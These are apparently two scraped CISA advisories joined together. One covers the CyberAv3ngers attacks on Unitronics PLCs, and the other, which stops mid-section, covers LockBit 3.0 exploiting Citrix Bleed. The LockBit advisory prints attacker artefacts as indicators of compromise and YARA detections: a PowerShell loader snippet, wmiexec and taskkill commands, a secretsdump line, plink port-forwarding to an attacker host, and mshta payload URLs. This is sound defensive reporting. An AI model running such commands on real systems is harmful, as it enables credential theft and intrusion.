Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See Table 1 for threat actor activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
CyberAv3ngers (also known as CyberAveng3rs, Cyber Avengers) is an Iranian IRGC cyber persona that has claimed responsibility for numerous attacks against critical infrastructure organizations.,1,2,3,4,5, The group claimed responsibility for cyberattacks in Israel beginning in 2020. CyberAv3ngers falsely claimed they compromised several critical infrastructure organizations in Israel.,2, CyberAv3ngers also reportedly has connections to another IRGC-linked group known as Soldiers of Solomon.
(Updated December 14, 2023) Most recently, CyberAv3ngers began targeting U.S.-based WWS facilities that operate Unitronics PLCs.,1, The threat actors compromised Unitronics Vision Series PLCs with human machine interfaces (HMI). These compromised devices were publicly exposed to the internet with default passwords and by default are on TCP port 20256. On December 11, 2023, CVE-2023-6448 was assigned to address the default passwords,CWE-798: Use of Hard Coded Credentials, and CISA added the CVE to its Known Exploited Vulnerabilities Catalog. On December 12, Unitronics released VisiLogic version 9.9.00 software to address this CVE; the update requires users to change default passwords.
These PLC and related controllers are often exposed to outside internet connectivity due to the remote nature of their control and monitoring functionalities. The compromise is centered around defacing the controller’s user interface and may render the PLC inoperative. With this type of access, deeper device and network level accesses are available and could render additional, more profound cyber physical effects on processes and equipment. It is not known if additional cyber activities deeper into these PLCs or related control networks and components were intended or achieved. Organizations should consider and evaluate their systems for these possibilities.
Threat Actor Activity
The authoring agencies have observed the IRGC-affiliated activity since at least October 2023, when the actors claimed credit for the cyberattacks against Israeli PLCs on their Telegram channel. Since November 2023, the authoring agencies have observed the IRGC-affiliated actors target multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs. Cyber threat actors likely compromised these PLCs since the PLCs were internet-facing and used Unitronics’ default password. Observed activity includes the following:

Between September 13 and October 30, 2023, the CyberAv3ngers Telegram channel displayed both legitimate and false claims of multiple cyberattacks against Israel. CyberAv3ngers targeted Israeli PLCs in the water, energy, shipping, and distribution sectors.
On October 18, 2023, the CyberAv3ngers-linked Soldiers of Solomon claimed responsibility for compromising over 50 servers, security cameras, and smart city management systems in Israel; however, majority of these claims were proven false. The group claimed to use a ransomware named “Crucio” against servers where the webcams camera software operated on port 7001.
Beginning on November 22, 2023, IRGC cyber actors accessed multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs with an HMI likely by compromising internet-accessible devices with default passwords. The targeted PLCs displayed the defacement message, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is Cyberav3ngers legal target.”

INDICATORS OF COMPROMISE
See Table 1 for observed IOCs related to CyberAv3nger operations.
(Updated December 14, 2023)

MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 2 for referenced threat actor tactics and techniques in this advisory.

MITIGATIONS
The authoring agencies recommend critical infrastructure organizations, including WWS sector facilities, implement the following mitigations to improve your organization’s cybersecurity posture to defend against CyberAv3ngers activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Note: The below mitigations are based on threat actor activity against Unitronics PLCs but apply to all internet-facing PLCs.
Network Defenders
The cyber threat actors likely accessed the affected devices—Unitronics Vision Series PLCs with HMI—by exploiting cybersecurity weaknesses, including poor password security and exposure to the internet. To safeguard against this threat, the authoring agencies urge organizations to consider the following:
Immediate steps to prevent attack:

(Updated December 14, 2023) Upgrade devices to 9.9.00 VisiLogic software, which requires users to change the default passwords on PLCs and HMIs. Use a strong password. For more information, see Unitronics’ blog Unitronics Cybersecurity for Vision and Samba PLC Series and Release notes for VisiLogic 9.9.00.
Disconnect the PLC from the public-facing internet.

Follow-on steps to strengthen your security posture:

Implement multifactor authentication for access to the operational technology (OT) network whenever applicable.
If you require remote access, implement a firewall and/or virtual private network (VPN) in front of the PLC to control network access. A VPN or gateway device can enable multifactor authentication for remote access even if the PLC does not support multifactor authentication.
Create strong backups of the logic and configurations of PLCs to enable fast recovery. Familiarize yourself with factory resets and backup deployment as preparation in the event of ransomware activity.
Keep your Unitronics and other PLC devices updated with the latest versions by the manufacturer.
Confirm third-party vendors are applying the above recommended countermeasures to mitigate exposure of these devices and all installed equipment.

In addition, the authoring agencies recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by cyber threat actors:

Reduce risk exposure. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. CISA Cyber Hygiene services can help provide additional review of organizations’ internet-accessible assets. Email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started.

Device Manufacturers
Although critical infrastructure organizations using Unitronics (including rebranded Unitronics) PLC devices can take steps to mitigate the risks, it is ultimately the responsibility of the device manufacturer to build products that are secure by design and default. The authoring agencies urge device manufacturers to take ownership of the security outcomes of their customers by following the principles in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software, primarily:

Do not ship products with default passwords. Instead, either ship products with random initial passwords or require users to change the password upon first use.
Do not expose administrative interfaces to the internet by default, and take steps to introduce friction should a device be placed in an insecure state.
Do not charge extra for basic security features needed to operate the product securely.
Support multifactor authentication, including via phishing-resistant methods.

By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing tiered security software and logs, monitoring, and making routine updates.
For more information on common misconfigurations and guidance on reducing their prevalence, see joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations. For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

EPA: Cybersecurity for the Water Sector
CISA: Water and Wastewater Systems Sector
CISA Alert: Exploitation of Unitronics PLCs used in Water and Wastewater Systems
CISA: Iran Cyber Threat Overview and Advisories
FBI: The Iran Threat - Web Page
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Cyber Hygiene Services
CISA: Shifting the Balance of Cybersecurity Risk - Principles and Approaches for Secure by Design Software
CISA: Secure by Design Alert - How Software Manufacturers Can Shield Web Management Interfaces from Malicious Cyber Activity
CISA, NSA: NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
CISA: Secure by Design and Default

REPORTING
All organizations should report suspicious or criminal activity related to information in this CSA to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or IC3.gov. For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
Additionally, the WaterISAC encourages members to share information by emailing analyst@waterisac.org, calling 866-H2O-ISAC, or using the online incident reporting form. State, local, tribal, and territorial governments should report incidents to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
REFERENCES

CBS News: Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group
Industrial Cyber: Digital Battlegrounds - Evolving Hybrid Kinetic Warfare
Bleeping Computer: Israel's Largest Oil Refinery Website Offline After DDoS Attack
Dark Reading: Website of Israeli Oil Refinery Taken Offline by Pro-Iranian Attackers
X: @CyberAveng3rs

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
VERSION HISTORY
December 1, 2023: Initial version.December 14, 2023: Added CVE, patch information, and IOC descriptions.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-335a
12,"



SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), Multi-State Information Sharing & Analysis Center (MS-ISAC), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) are releasing this joint Cybersecurity Advisory (CSA) to disseminate IOCs, TTPs, and detection methods associated with LockBit 3.0 ransomware exploiting CVE-2023-4966, labeled Citrix Bleed, affecting Citrix NetScaler web application delivery control (ADC) and NetScaler Gateway appliances.
This CSA provides TTPs and IOCs obtained from FBI, ACSC, and voluntarily shared by Boeing. Boeing observed LockBit 3.0 affiliates exploiting CVE-2023-4966, to obtain initial access to Boeing Distribution Inc., its parts and distribution business that maintains a separate environment. Other trusted third parties have observed similar activity impacting their organization.
Historically, LockBit 3.0 affiliates have conducted attacks against organizations of varying sizes across multiple critical infrastructure sectors, including education, energy, financial services, food and agriculture, government and emergency services, healthcare, manufacturing, and transportation. Observed TTPs for LockBit ransomware attacks can vary significantly in observed TTPs.
Citrix Bleed, known to be leveraged by LockBit 3.0 affiliates, allows threat actors to bypass password requirements and multifactor authentication (MFA), leading to successful session hijacking of legitimate user sessions on Citrix NetScaler web application delivery control (ADC) and Gateway appliances. Through the takeover of legitimate user sessions, malicious actors acquire elevated permissions to harvest credentials, move laterally, and access data and resources.
CISA and the authoring organizations strongly encourage network administrators to apply the mitigations found in this CSA, which include isolating NetScaler ADC and Gateway appliances and applying necessary software updates through the Citrix Knowledge Center.
The authoring organizations encourage network defenders to hunt for malicious activity on their networks using the detection methods and IOCs within this CSA. If a potential compromise is detected, organizations should apply the incident response recommendations. If no compromise is detected, organizations should immediately apply patches made publicly available.
For the associated Malware Analysis Report (MAR), see: MAR-10478915-1.v1 Citrix Bleed
Download the PDF version of this report:


AA23-325A LockBit 3.0 Ransomware Affiliates Exploit CVE 2023-4966 Citrix Bleed Vulnerability
(PDF,       631.83 KB
  )


For a downloadable copy of IOCs, see:


AA23-325A STIX XML
(XML,       29.22 KB
  )




AA23-325A STIX JSON
(JSON,       23.00 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
CVE-2023-4966
CVE-2023-4966 is a software vulnerability found in Citrix NetScaler ADC and NetScaler Gateway appliances with exploitation activity identified as early as August 2023. This vulnerability provides threat actors, including LockBit 3.0 ransomware affiliates, the capability to bypass MFA [T1556.006] and hijack legitimate user sessions [T1563].
After acquiring access to valid cookies, LockBit 3.0 affiliates establish an authenticated session within the NetScaler appliance without a username, password, or access to MFA tokens [T1539]. Affiliates acquire this by sending an HTTP GET request with a crafted HTTP Host header, leading to a vulnerable appliance returning system memory information [T1082]. The information obtained through this exploit contains a valid NetScaler AAA session cookie.
Citrix publicly disclosed CVE-2023-4966 on Oct. 10, 2023, within their Citrix Security Bulletin, which issued guidance, and detailed the affected products, IOCs, and recommendations. Based on widely available public exploits and evidence of active exploitation, CISA added this vulnerability to the Known Exploited Vulnerabilities (KEVs) Catalog. This critical vulnerability exploit impacts the following software versions [1]:

NetScaler ADC and NetScaler Gateway 14.1 before 14.1-8.50
NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.15
NetScaler ADC and NetScaler Gateway 13.0 before 13.0-92.19
NetScaler ADC and NetScaler Gateway version 12.1 (EOL)
NetScaler ADC 13.1FIPS before 13.1-37.163
NetScaler ADC 12.1-FIPS before 12.1-55.300
NetScaler ADC 12.1-NDcPP before 12.1-55.300

Due to the ease of exploitation, CISA and the authoring organizations expect to see widespread exploitation of the Citrix vulnerability in unpatched software services throughout both private and public networks.
Threat Actor Activity
Malware identified in this campaign is generated beginning with the execution of a PowerShell script (123.ps1) which concatenates two base64 strings together, converts them to bytes, and writes them to the designated file path.



$y = ""TVqQAAMA...<long base64 string>""$x = ""RyEHABFQ...<long base64 string>""$filePath = ""C:\Users\Public\adobelib.dll""$fileBytes = [System.Convert]::FromBase64String($y + $x)[System.IO.File]::WriteAllBytes($filePath, $fileBytes)



The resulting file (adobelib.dll) is then executed by the PowerShell script using rundll32.
rundll32 C:\Users\Public\adobelib.dll,main <104 hex char key>
The Dynamic Link Library (DLL) will not execute correctly without the 104 hex character key. Following execution, the DLL attempts to send a POST request to https://adobe-us-updatefiles[.]digital/index.php which resolves to IP addresses 172.67.129[.]176 and 104.21.1[.]180 as of November 16, 2023. Although adobelib.dll and the adobe-us-updatefiles[.]digital have the appearance of legitimacy, the file and domain have no association with legitimate Adobe software and no identified interaction with the software.
Other observed activities include the use of a variety of TTPs commonly associated with ransomware activity. For example, LockBit 3.0 affiliates have been observed using AnyDesk and Splashtop remote management and monitoring (RMM), Batch and PowerShell scripts, the execution of HTA files using the Windows native utility mshta.exe and other common software tools typically associated with ransomware incidents.
INDICATORS OF COMPROMISE (IOCS)
See Table 1–Table 5 for IOCs related to Lockbit 3.0 affiliate exploitation of CVE-2023-4966.
[Fidelity] Legend:

High = Indicator is unique or highly indicates LockBit in an environment.
Medium = Indicator was used by LockBit but is used outside of LockBit activity, albeit rarely.
Low = Indicates tools that are commonly used but were used by LockBit.

Low confidence indicators may not be related to ransomware.
Disclaimer: Some IP addresses in this CSA may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.

Table 1: LockBit 3.0 Affiliate Citrix Bleed Campaign


Indicator
Type
Fidelity
Description




192.229.221[.]95
IP
Low
Mag.dll calls out to this IP address. Ties back to dns0.org. Should run this DLL in a sandbox, when possible, to confirm C2. IP is shared hosting.


123.ps1
PowerShell script
High
Creates and executes payload via script.


193.201.9[.]224
IP
High
FTP to Russian geolocated IP from compromised system.


62.233.50[.]25
IP
High

Russian geolocated IP from compromised system.
Hxxp://62.233.50[.]25/en-us/docs.html
Hxxp://62.233.50[.]25/en-us/test.html



51.91.79[.].17
IP
Med
Temp.sh IP.


Teamviewer
Tool (Remote Admin)
Low
 


70.37.82[.]20
IP
Low
IP was seen from a known compromised account reaching out to an Altera IP address. LockBit is known to leverage Altera, a remote admin tool, such as Anydesk, team viewer, etc.


185.17.40[.]178
IP
Low
Teamviewer C2, ties back to a polish service provider, Artnet Sp. Zo.o. Polish IP address.




Table 2: LockBit 3.0 Affiliate Citrix Bleed Campaign


Indicator
Type
Fidelity
Description




185.229.191.41
Anydesk Usage
High
Anydesk C2.


81.19.135[.]219
IP
High

Russian geolocated IP hxxp://81.19.135[.]219/F8PtZ87fE8dJWqe.hta
Hxxp://81.19.135[.]219:443/q0X5wzEh6P7.hta



45.129.137[.]233
IP
Medium
Callouts from known compromised device beginning during the compromised window.


185.229.191[.]41
Anydesk Usage
High
Anydesk C2.


Plink.exe
Command interpreter
High
Plink (PuTTY Link) is a command-line connection tool, similar to UNIX SSH. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink can be used to automate SSH actions and for remote SSH tunneling on Windows.


AnyDeskMSI.exe
Remote admin tool
High
We do see that AnyDeskMSI.exe was installed as a service with “auto start” abilities for persistence. Config file from the image could be leveraged to find the ID and Connection IP, but we do not have that currently.


SRUtility.exe
Splashtop utility
 
9b6b722ba4a691a2fe21747cd5b8a2d18811a173413d4934949047e04e40b30a


Netscan exe
Network scanning software
High
498ba0afa5d3b390f852af66bd6e763945bf9b6bff2087015ed8612a18372155




Table 3: LockBit 3.0 Affiliate Citrix Bleed Campaign


Indicator
Type
Fidelity
Description





Scheduled task:
\MEGA\MEGAcmd


Persistence
 

High
 



Scheduled task:
UpdateAdobeTask

Persistence
High
 


Mag.dll
Persistence
High
Identified as running within UpdateAdobeTask cc21c77e1ee7e916c9c48194fad083b2d4b2023df703e544ffb2d6a0bfc90a63.


123.ps1
Script
High
Creates rundll32 C:\Users\Public\adobelib.dll,main ed5d694d561c97b4d70efe934936286fe562addf7d6836f795b336d9791a5c44.


Adobelib.dll
Persistence
Low
C2 from adobelib.dll.


Adobe-us-updatefiles[.]digital
Tool Download
High
Used to download obfuscated toolsets.


172.67.129[.]176
Tool Download
High
IP of adobe-us-updatefiles[.]digital.


104.21.1[.]180
Tool Download
High
Adobe-us-updatefiles[.]digital.


cmd.exe /q /c cd 1> \\127.0.0.1\admin$\__1698617793[.]44 2>&1
Command
High
wmiexec.exe usage


cmd.exe /q /c cd \ 1> \\127.0.0.1\admin$\__1698617793[.]44 2>&1
Command
High
wmiexec.exe usage


cmd.exe /q /c query user 1> \\127.0.0.1\admin$\__1698617793[.]44 2>&1
Command
High
wmiexec.exe usage


cmd.exe /q /c taskkill /f /im sqlwriter.exe /im winmysqladmin.exe /im w3sqlmgr.exe /im sqlwb.exe /im sqltob.exe /im sqlservr.exe /im sqlserver.exe /im sqlscan.exe /im sqlbrowser.exe /im sqlrep.exe /im sqlmangr.exe /im sqlexp3.exe /im sqlexp2.exe /im sqlex
Command
High
wmiexec.exe usage


cmd.exe /q /c cd \ 1> \\127.0.0.1\admin$\__1698618133[.]54 2>&1
Command
High
wmiexec.exe usage



The authoring organizations recommended monitoring/reviewing traffic to the 81.19.135[.]* class C network and review for MSHTA being called with HTTP arguments [2].

Table 4: LockBit 3.0 Affiliate Citrix Bleed Campaign


Indicator
Type
Fidelity
Description
Notes




81.19.135[.]219
IP
High
Russian geolocated IP used by user to request mshta with http arguments to download random named HTA file named q0X5wzzEh6P7.hta
 


81.19.135[.]220
IP
High
Russian geolocated IP, seen outbound in logs
IP registered to a South African Company


81.19.135[.]226
IP
High
Russian geolocated IP, seen outbound in logs
IP registered to a South African Company




Table 5: Citrix Bleed Indicators of Compromise (IOCs)


Type
Indicator
Description




Filename
c:\users\<username>\downloads\process hacker 2\peview.exe
Process hacker


Filename
c:\users\<username>\music\process hacker 2\processhacker.exe
Process hacker


Filename
psexesvc.exe
Psexec service excutable


Filename
c:\perflogs\processhacker.exe
Process hacker


Filename
c:\windows\temp\screenconnect\23.8.5.8707\files\processhacker.exe
Process hacker transferred via screenconnect


Filename
c:\perflogs\lsass.dmp
Lsass dump


Filename
c:\users\<username>\downloads\mimikatz.exe
Mimikatz


Filename
c:\users\<username>\desktop\proc64\proc.exe
Procdump


Filename
c:\users\<username>\documents\veeam-get-creds.ps1
Decrypt veeam creds


Filename
secretsdump.py
Impacket installed on azure vm


Cmdline
secretsdump.py <domain>/<username>@<ip> -outputfile 1
Impacket installed on azure vm


Filename
ad.ps1
Adrecon found in powershell transcripts


Filename
c:\perflogs\64-bit\netscan.exe
Softperfect netscan


Filename
tniwinagent.exe
Total network inventory agent


Filename
psexec.exe
Psexec used to deploy screenconnect


Filename
7z.exe
Used to compress files


Tool
Action1
RMM


Tool
Atera
RMM


tool
anydesk
rmm


tool
fixme it
rmm


tool
screenconnect
rmm


tool
splashtop
rmm


tool
zoho assist
rmm


ipv4
101.97.36[.]61
zoho assist


ipv4
168.100.9[.]137
ssh portforwarding infra


ipv4
185.20.209[.]127
zoho assist


ipv4
185.230.212[.]83
zoho assist


ipv4
206.188.197[.]22
powershell reverse shell seen in powershell logging


ipv4
54.84.248[.]205
fixme ip


Ipv4
141.98.9[.]137
Remote IP for CitrixBleed


domain
assist.zoho.eu
zoho assist


filename
c:\perflogs\1.exe
connectwise renamed


filename
c:\perflogs\run.exe
screenconnect pushed by psexec


filename
c:\perflogs\64-bit\m.exe
connectwise renamed


filename
c:\perflogs\64-bit\m0.exe
connectwise renamed


filename
c:\perflogs\za_access_my_department.exe
zoho remote assist


filename
c:\users\<username>\music\za_access_my_department.exe
zoho remote assist


filename
c:\windows\servicehost.exe
plink renamed


filename
c:\windows\sysconf.bat
runs servicehost.exe (plink) command


filename
c:\windows\temp\screenconnect\23.8.5.8707\files\azure.msi
zoho remote assist used to transfer data via screenconnect


cmdline
echo enter | c:\windows\servicehost.exe -ssh -r 8085:127.0.0.1:8085 <username>@168.100.9[.]137 -pw <password>
plink port forwarding


domain
eu1-dms.zoho[.]eu
zoho assist


domain
fixme[.]it
fixme it


domain
unattended.techinline[.]net
fixme it



MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 6 and Table 7 for all referenced threat actor tactics and techniques in this advisory.

Table 6: ATT&CK Techniques for Enterprise: Discovery


Technique Title
ID
Use




System Information Discovery
T1082
Threat actors will attempt to obtain information about the operating system and hardware, including versions, and patches.




Table 7: ATT&CK Techniques for Enterprise: Credential Access


Technique Title
ID
Use




Modify Authentication Process: Multifactor Authentication
T1556.006
Threat actors leverage vulnerabilities found within CVE- to compromise, modify, and/or bypass multifactor authentication to hijack user sessions, harvest credentials, and move laterally, which enables persistent access.


Steal Web Session Cookie
T1539
Threat actors with access to valid cookies can establish an authenticated session within the NetScaler appliance without a username, password, or access to multifactor authentication (MFA) tokens.



DETECTION METHODS
Hunting Guidance
Network defenders should prioritize observing users in session when hunting for network anomalies. This will aid the hunt for suspicious activity such as installing tools on the system (e.g., putty, rClone ), new account creation, log item failure, or running commands such as hostname, quser, whoami, net, and taskkill. Rotating credentials for identities provisioned for accessing resources via a vulnerable NetScaler ADC or Gateway appliance can also aid in detection.
For IP addresses:

Identify if NetScaler logs the change in IP.
Identify if users are logging in from geolocations uncommon for your organization’s user base.
If logging VPN authentication, identify if users are associated with two or more public IP addresses while in a different subnet or geographically dispersed.

Note: MFA to NetScaler will not operate as intended due to the attacker bypassing authentication by providing a token/session for an already authenticated user.
The following procedures can help identify potential exploitation of CVE-2023-4966 and LockBit 3.0 activity:

Search for filenames that contain tf0gYx2YI for identifying LockBit encrypted files.
LockBit 3.0 actors were seen using the C:\Temp directory for loading and the execution of files.
Investigate requests to the HTTP/S endpoint from WAF.
Hunt for suspicious login patterns from NetScaler logs
Hunt for suspicious virtual desktop agent Windows Registry keys
Analyze memory core dump files.

Below, are CISA developed YARA rules and an open-source rule that may be used to detect malicious activity in the Citrix NetScaler ADC and Gateway software environment. For more information on detecting suspicious activity within NetScaler logs or additional resources, visit CISA’s Malware Analysis Report (MAR) MAR-10478915-1.v1 Citrix Bleed or the resource section of this CSA [3]:
YARA Rules
CISA received four files for analysis that show files being used to save registry hives, dump the Local Security Authority Subsystem Service (LSASS) process memory to disk, and attempt to establish sessions via Windows Remote Management (WinRM). The files include:

Windows Batch file (.bat)
Windows Executable (.exe)
Windows Dynamic Link Library (.dll)
Python Script (.py)




rule CISA_10478915_01 : trojan installs_other_components{meta:author = ""CISA Code & Media Analysis""incident = ""10478915""date = ""2023-11-06""last_modified = ""20231108_1500""actor = ""n/a""family = ""n/a""capabilities = ""installs-other-components""malware_Type = ""trojan""tool_type = ""information-gathering""description = ""Detects trojan .bat samples""sha256 = ""98e79f95cf8de8ace88bf223421db5dce303b112152d66ffdf27ebdfcdf967e9""strings:$s1 = { 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 73 5c 7a 2e 74 78 74 }$s2 = { 72 65 67 20 73 61 76 65 20 68 6b 6c 6d 5c 73 79 73 74 65 6d 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 735c 65 6d }$s3 = { 6d 61 6b 65 63 61 62 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 61 2e 70 6e 67 20 63 3a 5c 77 69 6e 646f 77 73 5c 74 61 73 6b 73 5c 61 2e 63 61 62 }condition:all of them}



This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0[.]1 three times.
The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory. Again, a.bat pings the loop back address 127.0.0[.]1 one time before executing another reg save command and saves the HKLM\SAM registry hive into the C:\Windows\Task\am directory. Next, a.bat runs three makecab commands to create three cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\Users\Public\a.png. The names of the .cab files are as follows:

c:\windows\tasks\em.cab
c:\windows\tasks\am.cab
c:\windows\tasks\a.cab




rule CISA_10478915_02 : trojan installs_other_components{meta:author = ""CISA Code & Media Analysis""incident = ""10478915""date = ""2023-11-06""last_modified = ""20231108_1500""actor = ""n/a""family = ""n/a""capabilities = ""installs-other-components""malware_type = ""trojan""tool_type = ""unknown""description = ""Detects trojan PE32 samples""sha256 = ""e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068""strings:$s1 = { 57 72 69 74 65 46 69 6c 65 }$s2 = { 41 70 70 50 6f 6c 69 63 79 47 65 74 50 72 6f 63 65 73 73 54 65 72 6d 69 6e 61 74 69 6f 6e 4d 65 74 68 6f 64 }$s3 = { 6f 70 65 72 61 74 6f 72 20 63 6f 5f 61 77 61 69 74 }$s4 = { 43 6f 6d 70 6c 65 74 65 20 4f 62 6a 65 63 74 20 4c 6f 63 61 74 6f 72 }$s5 = { 64 65 6c 65 74 65 5b 5d }$s6 = { 4e 41 4e 28 49 4e 44 29 }condition:uint16(0) == 0x5a4d and pe.imphash() == ""6e8ca501c45a9b85fff2378cffaa24b2"" and pe.size_of_code == 84480 and all ofthem}



This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the remote procedure call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message ""[*]success"" in the console.



rule CISA_10478915_03 : trojan steals_authentication_credentials credential_exploitation{meta:author = ""CISA Code & Media Analysis""incident = ""10478915""date = ""2023-11-06""last_modified = ""20231108_1500""actor = ""n/a""family = ""n/a""capabilities = ""steals-authentication-credentials""malware_type = ""trojan""tool_type = ""credential-exploitation""description = ""Detects trojan DLL samples""sha256 = ""17a27b1759f10d1f6f1f51a11c0efea550e2075c2c394259af4d3f855bbcc994""strings:$s1 = { 64 65 6c 65 74 65 }$s2 = { 3c 2f 74 72 75 73 74 49 6e 66 6f 3e }$s3 = { 42 61 73 65 20 43 6c 61 73 73 20 44 65 73 63 72 69 70 74 6f 72 20 61 74 20 28 }$s4 = { 49 6e 69 74 69 61 6c 69 7a 65 43 72 69 74 69 63 61 6c 53 65 63 74 69 6f 6e 45 78 }$s5 = { 46 69 6e 64 46 69 72 73 74 46 69 6c 65 45 78 57 }$s6 = { 47 65 74 54 69 63 6b 43 6f 75 6e 74 }condition:uint16(0) == 0x5a4d and pe.subsystem == pe.SUBSYSTEM_WINDOWS_CUI and pe.size_of_code == 56832 and all ofthem}



This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\Users\Public.
Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\Windows\Tasks.



rule CISA_10478915_04 : backdoor communicates_with_c2 remote_access{meta:author = ""CISA Code & Media Analysis""incident = ""10478915""date = ""2023-11-06""last_modified = ""20231108_1500""actor = ""n/a""family = ""n/a""capabilities = ""communicates-with-c2""malware_type = ""backdoor""tool_type = ""remote-access""description = ""Detects trojan python samples""sha256 = ""906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6""strings:$s1 = { 70 6f 72 74 20 3d 20 34 34 33 20 69 66 20 22 68 74 74 70 73 22 }$s2 = { 6b 77 61 72 67 73 2e 67 65 74 28 22 68 61 73 68 70 61 73 73 77 64 22 29 3a }$s3 = { 77 69 6e 72 6d 2e 53 65 73 73 69 6f 6e 20 62 61 73 69 63 20 65 72 72 6f 72 }$s4 = { 57 69 6e 64 77 6f 73 63 6d 64 2e 72 75 6e 5f 63 6d 64 28 73 74 72 28 63 6d 64 29 29 }condition:all of them}



This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword ""hashpasswd"" is present. If the keyword ""hashpasswd"" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.
Open Source YARA Rule



